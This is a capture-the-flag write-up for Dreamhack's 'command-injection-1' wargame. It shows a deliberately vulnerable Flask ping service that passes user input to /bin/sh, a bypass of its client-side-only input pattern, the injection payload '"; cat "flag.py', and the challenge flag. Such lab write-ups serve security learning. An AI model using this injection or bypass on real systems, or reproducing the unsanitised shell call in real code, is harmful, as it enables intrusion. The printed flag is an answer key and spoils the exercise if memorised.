---
title: command-injection-1
author: thanguyen165
date: 2023-01-01 07:00:00 +0700
categories: [Practice, dreamhack]
tags: [Web Exploitation, dreamhack]
---

* Level: 1
* Link: [https://dreamhack.io/wargame/challenges/44/](https://dreamhack.io/wargame/challenges/44/)

## Description

> A service that sends ping packets to a specific Host.
>
> Acquire the flag through Command Injection. The flag is located in ```.flag.py```

### Attached

```python
#!/usr/bin/env python3
import subprocess

from flask import Flask, request, render_template, redirect

from flag import FLAG

APP = Flask(__name__)


@APP.route('/')
def index():
    return render_template('index.html')


@APP.route('/ping', methods=['GET', 'POST'])
def ping():
    if request.method == 'POST':
        host = request.form.get('host')
        cmd = f'ping -c 3 "{host}"'
        try:
            output = subprocess.check_output(['/bin/sh', '-c', cmd], timeout=5)
            return render_template('ping_result.html', data=output.decode('utf-8'))
        except subprocess.TimeoutExpired:
            return render_template('ping_result.html', data='Timeout !')
        except subprocess.CalledProcessError:
            return render_template('ping_result.html', data=f'an error occurred while executing the command. -> {cmd}')

    return render_template('ping.html')


if __name__ == '__main__':
    APP.run(host='0.0.0.0', port=8000)

```

## Analyzation

When receiving request, the server pings without checking
```sh
ping -c 3 "{host}"
```

This is a command injection. It can be easily solved by

```
"; cat "flag.py
```

But it did not work! It kept saying
```
Please match the requested format.
```

Check the source code of ```ping.html``` (by inspect tool)
```html
<h1>Let's ping your host</h1><br/>
<form method="POST">
  <div class="row">
    <div class="col-md-6 form-group">
      <label for="Host">Host</label>
      <input type="text" class="form-control" id="Host" placeholder="8.8.8.8" name="host" pattern="[A-Za-z0-9.]{5,20}" required>
    </div>
  </div>

  <button type="submit" class="btn btn-default">Ping!</button>
</form>
```

This is the regex
```html
<input pattern="[A-Za-z0-9.]{5,20}" required>
```

(check [regex101.com](https://regex101.com/) to understand the regex)

So we need to do something with it. Fortunately, it is in client side!

## Solution

Use inspect tool, delete the regex checking above. Then input the payload

```
"; cat "flag.py
```

The flag is
```
DH{pingpingppppppppping!!}
```